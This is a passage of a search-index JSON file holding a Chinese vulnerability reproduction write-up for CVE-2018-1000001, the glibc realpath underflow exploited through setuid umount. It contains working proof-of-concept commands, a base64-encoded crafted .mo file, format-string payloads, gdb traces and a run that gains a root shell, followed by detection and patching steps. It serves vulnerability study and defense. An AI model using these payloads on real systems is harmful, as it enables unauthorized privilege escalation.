            "title": "3. \u5b89\u88c5\u865a\u62df\u673a(\u6709\u6761\u4ef6\u53ef\u4ee5\u589e\u52a0-enable-kvm\u9009\u9879)"
        },
        {
            "location": "/cve-2018-1000001/#_1",
            "text": "",
            "title": "\u5224\u65ad\u65b9\u6cd5\uff1a"
        },
        {
            "location": "/cve-2018-1000001/#grep-e-vmxsvm-proccpuinfo",
            "text": "",
            "title": "grep -E 'vmx|svm' /proc/cpuinfo"
        },
        {
            "location": "/cve-2018-1000001/#lsmod-grep-kvm",
            "text": "$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso",
            "title": "lsmod | grep kvm"
        },
        {
            "location": "/cve-2018-1000001/#4",
            "text": "$ qemu-system-x86_64 -m 2048  debian9.img",
            "title": "4. \u542f\u52a8\u865a\u62df\u673a"
        },
        {
            "location": "/cve-2018-1000001/#5-gcc",
            "text": "$ su\n$ apt install gcc  ```   \u6b65\u9aa4\u4e00 \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650   shell\n # \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\n root$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone    \u6b65\u9aa4\u4e8c \u521b\u5efa\u5177\u6709\u72ec\u7acb user/mount namespace\u7684\u8fdb\u7a0b(\u4e0b\u6587\u79f0us_proc)    \u5176\u4ed6\u8fdb\u7a0b\u8fdb\u5165us_proc\u8fdb\u7a0b\u7684\"/proc/[us_proc pid]/cwd\"\u76ee\u5f55\u540e\uff0c\u7528realpath(getcwd)\u83b7\u53d6\u7684\u76f8\u5bf9\u76ee\u5f55\u5747\u5305\u542b\"(unreachable)/tmp/\"\u524d\u7f00    ```shell\n  /usr/bin/unshare -m -U --map-root-user /bin/bash\n  mount -t tmpfs tmpfs /tmp\n  cd /tmp\n  chmod 00755 .  # Terminal 1\n  debian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash\n  root@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp\n  root@debian:~/Desktop/work# cd /tmp\n  root@debian:/tmp# chmod 00755 .\n  root@debian:/tmp# echo $$\n  52426\n  root@debian:/tmp#   # \u6548\u679c\u5982\u4e0b\n  # Terminal 2\n  $ cd /proc/52426/cwd\n  debian@debian:/proc/52426/cwd$ \n  debian@debian:/proc/52426/cwd$ realpath .\n  (unreachable)/tmp\n  debian@debian:/proc/52426/cwd$ realpath ../x\n  (unreachable)/x\n  debian@debian:/proc/52426/cwd  ```    \u6b65\u9aa4\u4e09 \u521b\u5efa\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u7684\u76ee\u5f55\u548c\u6587\u4ef6    __gconv_find_shlib/C/LC_MESSAGES \u76ee\u5f55\u662fsetloacale\u5bfb\u627emo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\n    \u7279\u522b\u6ce8\u610f\u7684\u4e00\u70b9\uff1a __gconv_find_shlib  \u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u4e0d\u4e00\u6837\uff0c\u5728\u6f0f\u6d1e\u4f5c\u8005\u7684exp\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u4e24\u4e2a\u76ee\u5f55( from_archive, _nl_load_locale_from_archive )    \"(unreachable)/x\" \u662frealpath\u89e3\u6790\u7b26\u53f7\u94fe\u63a5\u7684\u8fd4\u56de\u503c\u5bf9\u5e94\u7684\u76ee\u5f55  util-linux.mo\u6587\u4ef6\u7528\u4e8e\u4fdd\u5b58\u7279\u5236\u7684libc\u4f9d\u8d56\u7684.mo\u7ffb\u8bd1\u6587\u4ef6  \u7b26\u53f7\u94fe\u63a5\u7528\u4e8e\u89e6\u53d1\u8d8a\u754c\u5199\u6f0f\u6d1e  util-linux.mo\u4fdd\u5b58\u4e86\u89e6\u53d1DOS\u7684\u7279\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\"AA%6$lnlnAAAAAAAAAA\"   ```shell\n  mkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/ gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\n  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\n  base64 -d <  \"(unreachable)/tmp/ gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\n  QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\n  mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\n  iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n  5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\n  B64-EOF  root@debian:/tmp# tree\n  .\n  \u2514\u2500\u2500 (unreachable)\n      \u251c\u2500\u2500 tmp\n      \u2502   \u251c\u2500\u2500 down -> ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\n      \u2502   \u2514\u2500\u2500 __gconv_find_shlib\n      \u2502       \u2514\u2500\u2500 C\n      \u2502           \u2514\u2500\u2500 LC_MESSAGES\n      \u2502               \u2514\u2500\u2500 util-linux.mo\n      \u2514\u2500\u2500 x  root@debian:/tmp# strings \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\n  %s: not mounted\n  Language: en\n  MIME-Version: 1.0\n  Content-Type: text/plain; charset=UTF-8\n  Content-Transfer-Encoding: 8bit\n  AA%6$lnlnAAAAAAAAAA  ```    \u6b65\u9aa4\u56db \u901a\u8fc7umount\u89e6\u53d1DOS    LC_ALL\u73af\u5883\u53d8\u91cf\u4f1a\u4f7fsetlocale\u51fd\u6570\u53bb\u52a0\u8f7d\u7ffb\u8bd1\u6587\u4ef6    umount\u4f1a\u5148\u5c1d\u8bd5\u5378\u8f7ddown\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u4f1a\u89e6\u53d1realpath\u6f0f\u6d1e\u9020\u6210\u8d8a\u754c\u5199\uff0c\u5c06\u5806\u5185\u5b58\u4e2d\u7684 \"/usr/lib/locale/C.utf8/LC_CTYPE\" \u8def\u5f84\u5b57\u7b26\u4e32\u4e2dLC_CTYPE\u8986\u76d6\u4e3aAAAAAA(\u7565...)/A    \u5f53realpath\u5c06down\u89e3\u6790\u4e3a(unreachable)/x\u540e\uff0cumount\u4f1a\u8c03\u7528warnx\u51fd\u6570\u6253\u5370\u8b66\u544a\u4fe1\u606f\uff0c\u6b64\u65f6\u4f1a\u52a0\u8f7d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c \"AA%6$lnlnAAAAAAAAAA\" \u66ff\u6362\u6389warnx\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 \"%s: not mounted\"    \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0cumount\u6808\u4e2dRSP\u5b58\u653e\u7684\u5730\u5740\u5904\u7684\u6307\u9488\u6307\u5411\u7684 long int\u503c(*(long *)$RSP) \u4f1a\u88ab\u4fee\u6539\u4e3a2\u3002\u8fd9\u4f1a\u5c06\u8be5\u5904\u5b58\u653e\u7684libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u5b57\u6bb5\u4fee\u6539\u4e3a0, \u4ece\u800c\u8ba9umount\u8ba4\u4e3a\u8c03\u7528\u8005\u662froot\u7528\u6237\uff0c\u5e76\u6210\u529f\u8fdb\u884c\u540e\u9762\u7684umount / \u64cd\u4f5c\u3002  \u8fd9\u4e2a\u6b65\u9aa4\u76f8\u5173\u7684umount\u8c03\u7528\u6808:  main->umount_one->make_exit_code->warnx(_(\"%s: not mounted\"), tgt);  (  \u683c\u5f0f\u5316\u5b57\u7b26\u4e32  ,  x64\u4f20\u53c2\u987a\u5e8f  )    shell\n  test$ cd /proc/2299/cwd\n  test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\n  AAlnAAAAAAAAAA",
            "title": "5. \u542f\u52a8\u540e\u5b89\u88c5GCC"
        },
        {
            "location": "/cve-2018-1000001/#4exp",
            "text": "",
            "title": "4.EXP"
        },
        {
            "location": "/cve-2018-1000001/#aexp",
            "text": "\u51c6\u5907\u9636\u6bb5(prepareNamespacedProcess)   \u5148\u901a\u8fc7clone\u542f\u52a8\u4e00\u4e2a\u62e5\u6709\u72ec\u7acbuser/mount namespace\u7684\u5b50\u8fdb\u7a0b\n  \u5b50\u8fdb\u7a0b\u542f\u52a8\u540e\uff0c\u4f1a\u5148\u7b49\u5f85\u7236\u8fdb\u7a0b\u5c06\u5176uid\u548cgid\u8bbe\u7f6e\u4e3a0(\u5f53\u524dnamespace)\n  \u7136\u540emount tmpfs\u5230/tmp\u76ee\u5f55\uff0c\u5e76\u5207\u6362\u5230/tmp\u4f5c\u4e3a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\n  \u521b\u5efa\u4e00\u4e2aready\u6587\u4ef6(O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY)   \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4fe1\u606f    \u5728clone\u51fa\u7684\u5b50\u8fdb\u7a0b\u5de5\u4f5c\u76ee\u5f55(/proc/[pid]/cwd)\u4e2d\u751f\u6210\u4e00\u7cfb\u5217\u6587\u4ef6\u548c\u76ee\u5f55    \u751f\u6210\u7684\u6587\u4ef6\u5982\u4e0b\uff1a  invincible@ubuntu:/proc/10013/cwd$ tree\n.\n\u251c\u2500\u2500 DATEMSK\n\u251c\u2500\u2500 ready\n\u2514\u2500\u2500 (unreachable)\n    \u251c\u2500\u2500 tmp\n    \u2502   \u251c\u2500\u2500 down -> ../x/../../AAA(\u7701\u7565...)A/AAA(\u7701\u7565...)A/A\n    \u2502   \u2514\u2500\u2500 from_archive\n    \u2502       \u251c\u2500\u2500 C.UTF-8\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2502       \u2514\u2500\u2500 util-linux.mo\n    \u2502       \u251c\u2500\u2500 X.x\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2514\u2500\u2500 X.X\n    \u2502           \u2514\u2500\u2500 LC_MESSAGES\n    \u2502               \u2514\u2500\u2500 util-linux.mo\n    \u2514\u2500\u2500 x\n\n\n10 directories, 5 files \ninvincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable\n\ninvincible@ubuntu:/proc/10013/cwd$ \ninvincible@ubuntu:/proc/10013/cwd$ file ready \nready: empty\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: fifo (named pipe)  \u6784\u9020\u7684DATEMSK\u6587\u4ef6\u5185\u5bb9\u4e3a/proc/self/exe\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u7684\u6587\u4ef6:  invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl  \u6784\u9020\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\u5185\u5bb9:  invincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po\ninvincible@ubuntu:~/Desktop/test$ cat util-linux.po \nmsgid \"\"\nmsgstr \"\"\n\"Language: en\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\nmsgstr \"1234\"\n\n\nmsgid \"%s: not mounted\"\nmsgstr \"\"\n\"AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n(\u7701\u7565... \u5171256\u4e2a%16lx)\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn\"\n\n\nmsgid \"\"\n\"%s: target is busy\\n\"\n\"        (In some cases useful info about processes that\\n\"\n\"         use the device is found by lsof(8) or fuser(1).)\"\nmsgstr \"5678\"\ninvincible@ubuntu:~/Desktop/test$   \u63d0\u6743\u9636\u6bb5(attemptEscalation)    \u51c6\u5907\u5de5\u4f5c    \u521b\u5efa\u7528\u4e8e\u548c\u5b50\u8fdb\u7a0b\u901a\u4fe1\u7684pipe\u7528\u4e8e\u8bfb\u53d6\u5b50\u8fdb\u7a0bstdout\u548cstderr    fork\u51fa\u5b50\u8fdb\u7a0b(\u4e0b\u6587\u79f0umout\u8fdb\u7a0b)\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u8bbe\u7f6epipe\uff0c\u5207\u6362\u5230us_proc\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\uff0cexecve\u6267\u884cumount\uff0c\u5177\u4f53\u6267\u884c\u547d\u4ee4\uff1a  ```shell\nAANGUAGE=X.X AANGUAGE=X.X (\u7701\u7565...\u5171255\u6b21) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0  ```    \u5f00\u59cb\u63d0\u6743    \u7b2c0\u6b65\uff0c\u7236\u8fdb\u7a0b\u5f00\u59cb\u6301\u7eed\u8bfb\u53d6umount\u8fdb\u7a0b\u7684\u8f93\u51fa\uff0c\u7b49\u5f85\"AAAAAAAA\"\u5b57\u7b26\u4e32\u7684\u51fa\u73b0   \u7b2c1\u6b65\uff0c\u8bfb\u53d6\u5b8c\u6574\u7684\u6808\u5185\u5b58\u6570\u636e\uff0c\u5e76\u5f00\u59cb\u89e3\u6790\uff0c\u6784\u9020\u7b2c\u4e8c\u9636\u6bb5\u7684util-linx.mo\u6587\u4ef6\u5185\u5bb9\u5e76\u5199\u5165  \u7b2c2\u6b65\uff0c\u6301\u7eed\u7b49\u5f85\uff0c\u76f4\u5230\u5728\u8d85\u65f6\u65f6\u95f4\u5185\uff0c\u7b2c\u4e8c\u9636\u6bb5util-linux.mo\u6587\u4ef6\u5185\u5bb9\u88abumount\u8bfb\u53d6  \u7b2c3\u6b65\uff0c\u8bfb\u53d6\u5269\u4e0b\u7684umount\u8f93\u51fa\u9632\u6b62\u5176\u88ab\u963b\u585e  umount\u542f\u52a8\u540e\uff0c\u89e3\u6790\u7b26\u53f7\u94fe\u63a5down\u4f1a\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4f7f\u5806\u5185\u5b58\u4e2d\u5b58\u653e\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\u5931\u6548\uff0c\u8feb\u4f7f\u5176\u52a0\u8f7d\u4f4d\u4e8e\u76f8\u5bf9\u76ee\u5f55C.UTF-8/LC_MESSAGES/\u4e2d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684 poisonous format string \u4f1a\u5c06\u6808\u5185\u5b58dump\u5230stderr\uff0c\u540c\u65f6\u8fd8\u4f1a\u901a\u8fc7\u6307\u5411\u73af\u5883\u53d8\u91cf\u7684\u6307\u9488\uff0c\u5c06\"AANGUAGE=X.X\"\u4fee\u6539\u4e3a\"LANGUAGE=X.X\"  umount\u7ee7\u7eed\u6267\u884c\uff0c\u7531\u4e8e\u73af\u5883\u53d8\u91cf\u88ab\u4fee\u6539\uff0c\u8fd9\u5c06\u4f7fumount\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5\u7684util-linux.mo\u6587\u4ef6(\u4f4d\u4e8eX.X/LC_MESSAGES\u76ee\u5f55\u4e0b\uff0c\u7531\u4e8e\u8be5\u6587\u4ef6\u4e3afifo named pipe\uff0c\u6240\u4ee5\u8fd9\u91ccumoun\u4f1a\u963b\u585e\u7b49\u5f85\u5176\u88ab\u5199\u5165\u6570\u636e)   umount\u8fdb\u7a0b\u5728\u7236\u8fdb\u7a0b\u7b2c1\u6b65\u5b8c\u6210\u540e\u6062\u590d\u6267\u884c\uff0c\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5c06\u4f1a\u4fee\u6539umount\u7684\u8fd4\u56de\u5730\u5740\uff0c\u901a\u8fc7setdate+execl\u5b9e\u73b0ROP\uff0c\u6700\u7ec8\u6267\u884cDATEMSK\u6587\u4ef6\u4e2d\u7684exp\u8fdb\u7a0b\uff0c\u5229\u7528umount\u63d0\u5347exp\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6743\u9650\u540e\u6267\u884c\uff0c\u751f\u6210root shell\u5b8c\u6210\u63d0\u6743    dump\u6808\u5185\u5b58\uff0c\u4fee\u6539restricted\u5b57\u6bb5\uff0c\u4fee\u6539AANGUAGE\u73af\u5883\u53d8\u91cf\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32    shell\n  \"AA%6$lnAAAAAA%016lx(\u7701\u7565... \u5171256\u4e2a%016lx)%016lx%1$68hhx%256$hhn\"   \u4fee\u6539\u8fd4\u56de\u5730\u5740\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32   ```shell\n  debian@debian:~/Desktop/work$ msgunfmt \"/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo\" -o util-linux.po\n  debian@debian:~/Desktop/work$ cat util-linux.po \n  msgid \"\"\n  msgstr \"\"\n  \"Language: en\\n\"\n  \"MIME-Version: 1.0\\n\"\n  \"Content-Type: text/plain; charset=UTF-8\\n\"\n  \"Content-Transfer-Encoding: 8bit\\n\"  msgid \"%s: mountpoint not found\"\n  msgstr \"\"\n  \"%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn\"\n  \"%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn\"\n  \"%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-\"\n  \"%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s\\n\"  msgid \"%s: not mounted\"\n  msgstr \"BBBB5678%3$s\\n\"  msgid \"\"\n  \"%s: target is busy\\n\"\n  \"        (In some cases useful info about processes that\\n\"\n  \"         use the device is found by lsof(8) or fuser(1).)\"\n  msgstr \"BBBBABCD%s\\n\"  ```",
            "title": "a.EXP\u539f\u7406"
        },
        {
            "location": "/cve-2018-1000001/#bexp",
            "text": "\u200b   \u590d\u73b0\u73af\u5883exp: \u89c1\u9644\u4ef6cve-2018-1000001-01.md  \u200b   \u539f\u4f5c\u8005exp:  exp.c",
            "title": "b.EXP\u6e90\u7801"
        },
        {
            "location": "/cve-2018-1000001/#c_1",
            "text": "\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePOC\u4e2d\u7684\u73af\u5883\u76f8\u540c    \u6b65\u9aa4\u4e00 \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650    shell\n   # \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\n   root$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone   \u6b65\u9aa4\u4e8c  \u7f16\u8bd1exp\u6587\u4ef6   \u4f7f\u7528\u7684\u662f\u4fee\u6539\u8fc7\u7684exp\uff0c\u5177\u4f53\u4fee\u6539\u4e86\u52a0\u8f7dmo\u7684\u76ee\u5f55\u548cexecl\u7684\u76f8\u5bf9\u504f\u79fb\u4ee5\u9002\u914d\u590d\u73b0\u73af\u5883  shell\n  gcc exp.c -o exp   \u6b65\u9aa4\u4e09 \u6267\u884cexp   ```shell\n  debian@debian:~/Desktop/work$ id\n  uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)\n  debian@debian:~/Desktop/work$ ./exp\n  ./exp: invoked as SUID, invoking shell ...\n  root@debian:~/Desktop/work# id\n  uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)\n  root@debian:~/Desktop/work#   ```   \u5982\u4f55\u83b7\u53d6util-linx.mo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84   ```shell\n  # \u5b9a\u4f4d\u5230_nl_find_msg\u8c03\u7528\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\n  char  _nl_find_msg (struct loaded_l10nfile  domain_file,\n            struct binding  domainbinding, const char  msgid,\n            int convert, size_t *lengthp)\n       internal_function;  # Terminal 1\n  /usr/bin/unshare -m -U --map-root-user /bin/bash\n  mount -t tmpfs tmpfs /tmp\n  cd /tmp\n  chmod 00755 .\n  mkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES\" \"(unreachable)/x\" \n  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\n  echo $$\n  46416  # Terminal 2\n  cd /proc/46416/cwd\n  gdb\n  file /bin/umount\n  set args --lazy down \n  set env LC_ALL=C.UTF-8\n  b main\n  r\n  b  umount_one if  (char  )$rsi == '('\n  c\n  b mk_exit_code\n  c\n  b  __dcigettext+1265\n  c  # \u901a\u8fc7\u8c03\u7528\u4fe1\u606f\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\n  \"(unreachable)/tmp/ gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\"\n  # \u56e0\u6b64\u76f8\u5bf9\u8def\u5f84\u5e94\u6539\u4e3a\uff1a gconv_find_shlib(\u539fexp\u4e2d\u662ffrom_archive)\n  [---------------------------------registers-------------------------\n  ...\n  RCX: 0x1 \n  RDX: 0x55698c49ee78 (\"%s: not mounted\")\n  RSI: 0x55698e233200 (\"AAAAAA/A\")\n  RDI: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/ gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\n  ...\n  R8 : 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n  ...\n  [-------------------------------------code-------------------------\n  ...\n  => 0x7fb5d4d69d21 < dcigettext+1265>:    call   0x7fb5d4d68bc0 <_nl_find_msg>\n   ...\n  Guessed arguments:\n  arg[0]: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\n  arg[1]: 0x55698e233200 (\"AAAAAA/A\")\n  arg[2]: 0x55698c49ee78 (\"%s: not mounted\")\n  arg[3]: 0x1 \n  arg[4]: 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f   Breakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (\n  ...\n  gdb-peda$   # \u8c03\u7528\u6808\u5982\u4e0b\n  gdb-peda$ bt\n  #0  0x00007fb5d4d69d21 in  dcigettext (\n      domainname=0x55698e233580 \"util-linux\", \n      msgid1=0x55698c49ee78 \"%s: not mounted\", \n      msgid2=0x0, plural=0x0, n=0x0, \n      category=0x5) at dcigettext.c:742\n  #1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)\n      at sys-utils/umount.c:206\n  #2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...\n  #3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...\n  #4  0x00007fb5d4d5c2e1 in  libc_start_main (main=0x55698c49c970 ...\n  #5  0x000055698c49d3aa in _start ()  ```   \u5982\u4f55\u5728umount\u4e2ddump\u6808\u5185\u5b58\u7684\u4f4d\u7f6e\u4e0b\u65ad\u70b9   ```shell\n  gcc my_exp.c -o exp4dbg -g\n  gdb\n  file exp4dbg\n  b main\n  r\n  set follow-fork-mode parent\n  b attemptEscalation\n  c\n  set follow-fork-mode child\n  c\n  b  umount_one if  (char  )$rsi == '('\n  c\n  b mk_exit_code\n  c\n  b  mk_exit_code+165\n  c  => 0x561465315695  : call   0x561465314560  warnx@plt  gdb-peda$ bt\n  #0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...\n  #1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...\n  #2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, \n  ...\n  #3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...\n  #4  0x00005614653153aa in _start ()\n  gdb-peda$   ```",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/cve-2018-1000001/#d",
            "text": "\u5229\u7528\u8d8a\u754c\u5199\u6f0f\u6d1e\uff0c\u63a7\u5236gettext\u51fd\u6570\u52a0\u8f7d\u7279\u5236\u7684NLS\u6587\u4ef6\uff0c\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32    \u683c\u5f0f\u5316\u5b57\u7b26\u4e32dump\u6808\u5185\u5b58\u6839\u636e\u6808\u5185\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6libc\u57fa\u5730\u5740\u7ed5\u8fc7ASLR    \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4fee\u6539\u6808\u5185\u5b58\u51fd\u6570\u53c2\u6570\u548c\u8fd4\u56de\u5730\u5740\u8fdb\u800c\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b    \u901a\u8fc7setdate\u8fd9\u6837\u7684\u7b80\u5355\u51fd\u6570\u4e3aexecl\u6784\u9020\u5408\u9002\u7684\u6808\u73af\u5883\u5b9e\u73b0ROP    \u901a\u8fc7\u63a7\u5236suid\u8fdb\u7a0bumount\u7684\u6267\u884c\u6d41\u7a0b\u6765\u521b\u5efaroot shell\u5b9e\u73b0\u63d0\u6743",
            "title": "d.\u5229\u7528\u6838\u5fc3\u8981\u7d20"
        },
        {
            "location": "/cve-2018-1000001/#5",
            "text": "\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u98ce\u9669\uff0c\u53ca\u65f6\u66f4\u65b0\u7cfb\u7edf\uff0c\u5b89\u88c5\u8865\u4e01\u3002\u68c0\u6d4b\u65b9\u5f0f\u5982\u4e0b\uff1a   ```shell\n  # \u65b9\u5f0f\u4e00\uff1a\n  # Terminal 1\n  $ sudo echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n  $ /usr/bin/unshare -m -U --map-root-user /bin/bash\n  $ mount -t tmpfs tmpfs /tmp\n  $ cd /tmp\n  $ echo $$\n  2607  # Terminal 2\n  $ cd /proc/2607/cwd\n  $ realpath .\n  (unreachable)/tmp\n  # \u5982\u679c\u8fd4\u56de\u503c\u5305\u542b(unreachable)\u5b57\u7b26\u4e32\u5219\u53ef\u4ee5\u5224\u65ad\u5b58\u5728\u98ce\u9669  # \u65b9\u5f0f\u4e8c\uff1a\n  # \u67e5\u770bglibc\u7684package\u66f4\u65b0\u65e5\u5fd7\u662f\u5426\u5b58\u5728CVE-2018-1000001\u7684\u8865\u4e01\n  # \u4ee5\u5b89\u88c5\u4e86\u8865\u4e01\u7684ubuntu16\u4e3a\u4f8b\uff1a\n  $ PAGER=cat apt-get -q=2 changelog libc6\n  ...\n    * SECURITY UPDATE: Buffer underflow in realpath()\n      - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:\n        Make getcwd(3) fail if it cannot obtain an absolute path\n      - CVE-2018-1000001\n  ...  ```    